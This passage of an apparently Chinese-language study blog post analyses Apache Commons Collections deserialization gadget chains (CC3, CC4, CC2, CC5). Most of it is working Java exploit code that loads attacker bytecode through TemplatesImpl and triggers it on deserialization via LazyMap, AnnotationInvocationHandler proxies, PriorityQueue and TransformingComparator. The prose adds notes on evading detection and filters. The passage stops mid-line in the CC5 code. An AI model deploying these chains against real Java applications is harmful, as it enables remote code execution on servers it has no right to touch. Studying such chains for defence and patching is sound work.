+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    <span class="comment">//读取对应路径的class文件内容</span></span><br><span class="line">    <span class="keyword">byte</span>[] exp = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\idea\\IdeaRepository\\WebSecurity\\unserializable\\CC3StudyTest\\target\\classes\\org\\mentat\\exp\\MyExp.class&quot;</span>));</span><br><span class="line">    TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">    <span class="comment">//为templates对象赋值</span></span><br><span class="line">    Class&lt;? extends TemplatesImpl&gt; clazz = templates.getClass();</span><br><span class="line">    Field f1 = clazz.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">    f1.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    f1.set(templates,<span class="string">&quot;&quot;</span>);</span><br><span class="line">    Field f2 = clazz.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">    f2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">byte</span>[][] exps = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;exp&#125;;</span><br><span class="line">    f2.set(templates,exps);</span><br><span class="line">    <span class="comment">//因为还没写完，不进行序列化，所以得赋值</span></span><br><span class="line">    Field f3 = clazz.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">    f3.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    <span class="comment">//使用反序列给的默认值</span></span><br><span class="line">    f3.set(templates,<span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">    <span class="comment">//调用攻击链</span></span><br><span class="line">    templates.newTransformer();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过调用，发现了空指针异常，定位到错误处观察。</p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220113234004315.png" class="">
+
+<p>首先它进行加载之后，会获取到对应类的父类，然后通过判断父类进行一些操作，接下来就有2条路了，但是看到后面还有一个判断，又结合_transletIndex的默认值为-1，得到结论是必须的进入上面的if，也就是我们exp类得是那个常量的子类。</p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220113234302447.png" class="">
+
+<p>我们再使用exp类继承它即可，因为它是抽象类，只需要实现一下方法，该链就成功利用了！</p>
+<p>因为我们已经找到了方法调用，所以我们可以直接结合CC1链，利用InvocationTransform进行调用。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    <span class="comment">//读取对应路径的class文件内容</span></span><br><span class="line">    <span class="keyword">byte</span>[] exp = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\idea\\IdeaRepository\\WebSecurity\\unserializable\\CC3StudyTest\\target\\classes\\org\\mentat\\exp\\MyExp.class&quot;</span>));</span><br><span class="line">    TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">    <span class="comment">//为templates对象赋值</span></span><br><span class="line">    Class&lt;? extends TemplatesImpl&gt; templatesClass = templates.getClass();</span><br><span class="line">    Field f1 = templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">    f1.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    f1.set(templates,<span class="string">&quot;&quot;</span>);</span><br><span class="line">    Field f2 = templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">    f2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">byte</span>[][] exps = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;exp&#125;;</span><br><span class="line">    f2.set(templates,exps);</span><br><span class="line">    <span class="comment">//因为还没写完，不进行序列化，所以得赋值</span></span><br><span class="line">    Field f3 = templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">    f3.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    f3.set(templates,<span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">    Transformer[] transformers = &#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(templates),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> Class[]&#123;&#125;, <span class="keyword">new</span> Object[]&#123;&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line">    ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">    HashMap&lt;Object, Object&gt; lzMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    Map map = LazyMap.decorate(lzMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">    Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">    constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    InvocationHandler proxyHandler = (InvocationHandler) constructor.newInstance(Retention.class, map);</span><br><span class="line">    Map proxyObj = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="keyword">new</span> Class[]&#123;Map.class&#125;, proxyHandler);</span><br><span class="line"></span><br><span class="line">    Object o = constructor.newInstance(Retention.class, proxyObj);</span><br><span class="line">    MySerUtils.writeObject(o);</span><br><span class="line">    MySerUtils.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>成功执行，ysoserial利用了其他的transform进行调用，因为有多个链利用InvokerTransformer，所以它利用其他的对象构成链，好逃避检测。</p>
+<p>然后就找到了<code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code>的构造方法，它是newTransformer的上层调用，还非常好利用，并且它没有实现序列化接口，所以我们得利用反射进行实例化，这个时候就利用到了<code>InstantiateTransformer</code>。</p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220114000313897.png" class="">
+
+<h3 id="3、链成"><a href="#3、链成" class="headerlink" title="3、链成"></a>3、链成</h3><p>通过分析就可以直接利用了！</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    <span class="comment">//读取对应路径的class文件内容</span></span><br><span class="line">    <span class="keyword">byte</span>[] exp = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\idea\\IdeaRepository\\WebSecurity\\unserializable\\CC3StudyTest\\target\\classes\\org\\mentat\\exp\\MyExp.class&quot;</span>));</span><br><span class="line">    TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">    <span class="comment">//为templates对象赋值</span></span><br><span class="line">    Class&lt;? extends TemplatesImpl&gt; templatesClass = templates.getClass();</span><br><span class="line">    Field f1 = templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">    f1.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    f1.set(templates,<span class="string">&quot;&quot;</span>);</span><br><span class="line">    Field f2 = templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">    f2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">byte</span>[][] exps = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;exp&#125;;</span><br><span class="line">    f2.set(templates,exps);</span><br><span class="line">    Transformer[] transformers = &#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class="line">        <span class="keyword">new</span> InstantiateTransformer(<span class="keyword">new</span> Class[]&#123;Templates.class&#125;,<span class="keyword">new</span> Object[]&#123;templates&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line">    ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">    HashMap&lt;Object, Object&gt; lzMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    Map map = LazyMap.decorate(lzMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">    Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">    constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    <span class="comment">//这是代理处理器</span></span><br><span class="line">    InvocationHandler proxyHandler = (InvocationHandler) constructor.newInstance(Retention.class, map);</span><br><span class="line">    Map proxyObj = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="keyword">new</span> Class[]&#123;Map.class&#125;, proxyHandler);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//需要反序列化的对象</span></span><br><span class="line">    Object o = constructor.newInstance(Retention.class, proxyObj);</span><br><span class="line">    <span class="comment">//自己封装的序列化以及反序列化</span></span><br><span class="line">    MySerUtils.writeObject(o);</span><br><span class="line">    MySerUtils.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>注意<code>ConstantTransformer</code>的参数，并且_tfactory也可以不用赋值了，调用过程：</p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220114001503621.png" class="">
+
+<p>总结：</p>
+<ul>
+<li>我们可以有多条路进行调用，可以利用InvokerTransformer，再往前还有3条路。</li>
+<li>可以造成任意代码执行</li>
+<li>class的路径可以使用http服务器上面的资源</li>
+</ul>
+<h2 id="6）CC4链"><a href="#6）CC4链" class="headerlink" title="6）CC4链"></a>6）CC4链</h2><p>这条链是针对CommonsCollections4版本构成的。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>链的构成后半段基本都是一样的，要么调用Runtime.exec，要么通过加载class。所以我们只需要找到前半段，通过找到CC4版本中调用transform方法的类。</p>
+<p>然后找到了<code>org.apache.commons.collections4.comparators.TransformingComparator</code>这个类，首先它可以进行序列化，然后它调用transform的方法很常见。虽然这个类在CC3版本中存在的，但是它没有实现可序列化接口。</p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220114163412056.png" class="">
+
+<p>接着找他的上层调用者，就找到了<code>PriorityQueue</code>，这个类也是可以序列化的，并且在readObject方法中最终会调用到compare方法，调用链：<code>readObject -&gt; heapify -&gt; siftDown -&gt; siftDownUsingComparator -&gt; compare</code></p>
+<p>根据两个类的构造方法，很快就能写出链。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    <span class="keyword">byte</span>[] exp = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\idea\\IdeaRepository\\WebSecurity\\unserializable\\CC3StudyTest\\target\\classes\\org\\mentat\\exp\\MyExp.class&quot;</span>));</span><br><span class="line">    TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">    Class&lt;? extends TemplatesImpl&gt; templatesClass = templates.getClass();</span><br><span class="line">    Field f1 = templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">    f1.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    f1.set(templates,<span class="string">&quot;&quot;</span>);</span><br><span class="line">    Field f2 = templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">    f2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">byte</span>[][] exps = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;exp&#125;;</span><br><span class="line">    f2.set(templates,exps);</span><br><span class="line">    Transformer[] transformers = &#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class="line">        <span class="keyword">new</span> InstantiateTransformer(<span class="keyword">new</span> Class[]&#123;Templates.class&#125;,<span class="keyword">new</span> Object[]&#123;templates&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line">    ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">    TransformingComparator tc = <span class="keyword">new</span> TransformingComparator&lt;&gt;(chainedTransformer);</span><br><span class="line"></span><br><span class="line">    PriorityQueue pq = <span class="keyword">new</span> PriorityQueue&lt;&gt;(tc);</span><br><span class="line">    MySerUtils.writeObject(pq);</span><br><span class="line">    MySerUtils.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>结果无事发生。</p>
+<h3 id="1、问题排查"><a href="#1、问题排查" class="headerlink" title="1、问题排查"></a>1、问题排查</h3><p>发现在<code>priorityQueue</code>中调用heapify方法，有一个for循环，我们需要进入循环，就得size在规定值。通过条件获取到<code>&gt;&gt;&gt;</code>是位移符号，向右位移1就是除以2，得到的值必须至少为0，也就是size至少为2。</p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220114170524936.png" class="">
+
+<p>随便添加2条数据即可：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pq.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">pq.add(<span class="string">&quot;2&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>然后再次运行，发现又报错了：</p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220114224129147.png" class="">
+
+<p>根据idea提示，是在调用add方法时报的错误，调用链：<code>add -&gt; offer -&gt; siftUp -&gt;  siftUpUsingComparator</code></p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220114224258894.png" class="">
+
+<p>当它在进行add是会调用到该对象的comparator方法，这个时候就会去执行我们对应的链，我们知道，CC3这条链有一个tfactory变量，它默认是没有赋值的，它是在反序列化的时候才会赋值，所以这里爆出了空指针异常。</p>
+<h3 id="2、链成-1"><a href="#2、链成-1" class="headerlink" title="2、链成"></a>2、链成</h3><p>解决方法：既然它在add的时候会调用我们的链，那我们可以在add之前放入一个其他的对象，然后通过反射修改。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    <span class="keyword">byte</span>[] exp = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\idea\\IdeaRepository\\WebSecurity\\unserializable\\CC3StudyTest\\target\\classes\\org\\mentat\\exp\\MyExp.class&quot;</span>));</span><br><span class="line">    TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">    Class&lt;? extends TemplatesImpl&gt; templatesClass = templates.getClass();</span><br><span class="line">    Field f1 = templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">    f1.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    f1.set(templates,<span class="string">&quot;&quot;</span>);</span><br><span class="line">    Field f2 = templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">    f2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">byte</span>[][] exps = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;exp&#125;;</span><br><span class="line">    f2.set(templates,exps);</span><br><span class="line">    Transformer[] transformers = &#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class="line">        <span class="keyword">new</span> InstantiateTransformer(<span class="keyword">new</span> Class[]&#123;Templates.class&#125;,<span class="keyword">new</span> Object[]&#123;templates&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line">    ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">    TransformingComparator tc = <span class="keyword">new</span> TransformingComparator&lt;&gt;(<span class="keyword">new</span> ConstantTransformer&lt;&gt;(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    PriorityQueue pq = <span class="keyword">new</span> PriorityQueue&lt;&gt;(tc);</span><br><span class="line">    pq.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">    pq.add(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">    <span class="comment">//修改链 TransformingComparator和ChainedTransformer都行</span></span><br><span class="line">    Field transformersField = tc.getClass().getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">    transformersField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    transformersField.set(tc,chainedTransformer);</span><br><span class="line"></span><br><span class="line">    MySerUtils.writeObject(pq);</span><br><span class="line">    MySerUtils.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>调用流程：</p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220114225441417.png" class="">
+
+<h2 id="7）CC2链"><a href="#7）CC2链" class="headerlink" title="7）CC2链"></a>7）CC2链</h2><p>CC4那条链还是可以升级的，我们知道在TemplatesImpl调用newTransformer方法时是会直接实例化的，这个时候我们可以直接通过invokerTransform进行方法调用。</p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220114230959465.png" class="">
+
+<p>最主要是PriorityQueue里的readObject调用compare方法会将队列里面的值进行调用，也就是帮我们的链进行了参数调用，然后我们将transformer变为invokerTransform，然后obj1或者obj2就会变为需要调用方法的对象，那不就可以省去ChainedTransformer这个条件吗。</p>
+<p>还是有个老问题，不能先赋值，不然会触发TemplatesImpl中的tfactory空指针异常</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    <span class="keyword">byte</span>[] exp = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\idea\\IdeaRepository\\WebSecurity\\unserializable\\CC3StudyTest\\target\\classes\\org\\mentat\\exp\\MyExp.class&quot;</span>));</span><br><span class="line">    TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">    Class&lt;? extends TemplatesImpl&gt; templatesClass = templates.getClass();</span><br><span class="line">    Field f1 = templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">    f1.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    f1.set(templates,<span class="string">&quot;&quot;</span>);</span><br><span class="line">    Field f2 = templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">    f2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">byte</span>[][] exps = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;exp&#125;;</span><br><span class="line">    f2.set(templates,exps);</span><br><span class="line">    <span class="comment">//独立出来 直接放入</span></span><br><span class="line">    InvokerTransformer&lt;Object, Object&gt; invokerTransformer = <span class="keyword">new</span> InvokerTransformer&lt;&gt;(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> Class[]&#123;&#125;, <span class="keyword">new</span> Object[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">    TransformingComparator tc = <span class="keyword">new</span> TransformingComparator&lt;&gt;(<span class="keyword">new</span> ConstantTransformer&lt;&gt;(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    PriorityQueue pq = <span class="keyword">new</span> PriorityQueue&lt;Object&gt;(tc);</span><br><span class="line">    pq.add(templates);</span><br><span class="line">    pq.add(templates);</span><br><span class="line">    <span class="comment">//修改链</span></span><br><span class="line">    Field transformersField = tc.getClass().getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">    transformersField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    transformersField.set(tc,invokerTransformer);</span><br><span class="line"></span><br><span class="line">    MySerUtils.writeObject(pq);</span><br><span class="line">    MySerUtils.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>优点：</p>
+<ul>
+<li>省去了ChainedTransformer，可以防止数组过滤</li>
+<li>可以调用任意代码执行以及任意类加载</li>
+</ul>
+<p>ysoserial调用链：</p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220114233401583.png" class="">
+
+<p>它是直接调的任意代码执行。</p>
+<h2 id="8）CC5链"><a href="#8）CC5链" class="headerlink" title="8）CC5链"></a>8）CC5链</h2><img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220114233933212.png" class="">
+
+<p>直接看ysoserial的调用链，发现是和CC6很类似，只不过调用的TiedMapEntry的toString方法。</p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220114234050783.png" class="">
+
+<p>它调用了本类的getValue方法。</p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220114234106670.png" class="">
+
+<p>而这个方法调用了map的get方法，那就可以触发LazyMap的后续链了。入口类是BadAttributeValueExpException。</p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220115000824023.png" class="">
+
+<p>它的readObject方法里面是gf.get到数据之后隐式调用该对象的toString。</p>
+<p>调用图：</p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220114234322342.png" class="">
+
+<p>调用链：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    Class&lt;Runtime&gt; rClass = Runtime.class;</span><br><span class="line">    Transformer[] transformers = &#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(rClass),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span 